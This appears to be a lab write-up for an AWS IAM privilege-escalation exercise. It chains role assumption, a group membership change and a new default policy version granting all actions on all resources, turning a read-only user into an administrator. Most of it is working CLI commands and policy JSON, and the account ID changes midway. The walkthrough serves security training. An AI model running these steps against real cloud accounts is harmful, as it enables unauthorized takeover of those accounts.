### Dangerous Policy Combination II

First the profile has to be configured with the access keys provided by PT Academy

## Walkthrough

Get the attached user policies for `student` user which shows `IAMReadOnlyAccess` permission `aws iam list-attached-user-policies --user-name student --profile PTAcademyJllerena`

![image](https://user-images.githubusercontent.com/46797181/222863836-e087ae15-632c-4700-9537-0d8fa592fd96.png)

To get information about that attached policy, execute the below commands

```
aws iam list-user-policies --user-name student --profile PTAcademyJllerena
aws iam get-user-policy --user-name student --policy-name terraform-20230304005305909200000003 --profile PTAcademyJllerena

```
![image](https://user-images.githubusercontent.com/46797181/222868760-5cc5c2d0-0081-48c0-918f-34ce5cc9b98a.png)

Trying to create a user with `aws iam create-user --user-name jllerena --profile PTAcademyJllerena` will give a denied message direc

![image](https://user-images.githubusercontent.com/46797181/222869046-fa11aa80-93a7-4937-ac97-cbbfa03447f9.png)

Check Adder role policies and permissions. Also, check the role-policy document

```
aws iam list-role-policies --role-name Adder --profile PTAcademyJllerena
aws iam get-role-policy --role-name Adder --policy-name AddUser --profile PTAcademyJllerena 

```
![image](https://user-images.githubusercontent.com/46797181/222869512-0fd5c70d-5d77-4923-926a-397c12074313.png)

Role policy says that role Adder has permission to add any user to the Printers group. Next step is to assume Adder role with student user. `aws sts assume-role --role-arn arn:aws:iam::213923356313:role/Adder --role-session-name adder_jllerena --profile PTAcademyJllerena` 

![image](https://user-images.githubusercontent.com/46797181/222869789-58fb66f0-b288-4b69-a6e0-c3bb2eb9bbae.png)

Add student user to printers group and unset environment variable. 

```
aws iam add-user-to-group --group-name Printers --user-name student
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN

```
List groups for the student user. `aws iam list-groups-for-user --user-name student --profile PTAcademyJllerena`
![image](https://user-images.githubusercontent.com/46797181/222870473-52b827c6-77ba-4a26-b2bc-8bc21df7156b.png)

Check the policies attached to the PolicyUpdater role policies and check the role-policy document.
```
aws iam list-role-policies --role-name PolicyUpdater --profile PTAcademyJllerena
aws iam get-role-policy --role-name PolicyUpdater --policy-name CreatePolicyVersion --profile PTAcademyJllerena
```

![image](https://user-images.githubusercontent.com/46797181/222870852-ed359f25-7b31-462a-ac7b-12162fcffdd3.png)

Role policy says that role PolicyUpdater has permission to create a new PolicyVersion for `Print` policy. Check the policies attached to the group `Printers`. `aws iam list-attached-group-policies --group-name Printers --profile PTAcademyJllerena`

![image](https://user-images.githubusercontent.com/46797181/222871232-0a83488b-db51-4482-b054-cd0ae52b7a3b.png)

The Print policy is attached to the Printers group. List the version of policies available for Print policy `aws iam get-policy --policy-arn arn:aws:iam::213923356313:policy/Print --profile PTAcademyJllerena`

![image](https://user-images.githubusercontent.com/46797181/222871463-961b5e3f-fb4c-4d37-8fb6-520ac16d3534.png)

View the policy document for v1 version of Print policy `aws iam get-policy-version --policy-arn arn:aws:iam::213923356313:policy/Print --version-id v1 --profile PTAcademyJllerena`

![image](https://user-images.githubusercontent.com/46797181/222871742-3b49d9f8-4830-43cf-961e-754c8767f9c0.png)

Assume PolicyUpdater role. `aws sts assume-role --role-arn arn:aws:iam::213923356313:role/PolicyUpdater --role-session-name policy_jllerena --profile PTAcademyJllerena`

![image](https://user-images.githubusercontent.com/46797181/222871903-58f59a50-c386-4b5c-86e4-2202dac6d638.png)

Set the access key id, secret access key, and session token in environment variables.

```
export AWS_ACCESS_KEY_ID=<access key id>
export AWS_SECRET_ACCESS_KEY=<secret access key>
export AWS_SESSION_TOKEN=<session token>

```

Create a new policy version and set it as default. Use the following policy document for Administrator Access.
```
{
 "Version": "2012-10-17",
 "Statement": [
   {
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
   }
  ]
}
```
Execute `aws iam create-policy-version --policy-arn arn:aws:iam::165405147110:policy/Print --policy-document file://jllPolicy.json --set-as-default`

Then unset the env variables
```
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN
```
![image](https://user-images.githubusercontent.com/46797181/222872569-bfec65e6-12ca-4b6f-a500-50356d5abe1a.png)

Check the new version of the Print policy. `aws iam get-policy-version --policy-arn arn:aws:iam::165405147110:policy/Print --version-id v2 --profile PTAcademyJllerena`

![image](https://user-images.githubusercontent.com/46797181/222872694-b05df9e4-6322-4f64-b2c3-baf9464e0f05.png)

Try creating a new user on the AWS account named jllerena to verify `Administrator` access. `aws iam create-user --user-name jllerena --profile PTAcademyJllerena`

![image](https://user-images.githubusercontent.com/46797181/222873174-331a6285-8263-4238-9029-a4c7040f8c63.png)

With the new permissions, a new user was possible to create, therefore privilege escalation has been achieved 






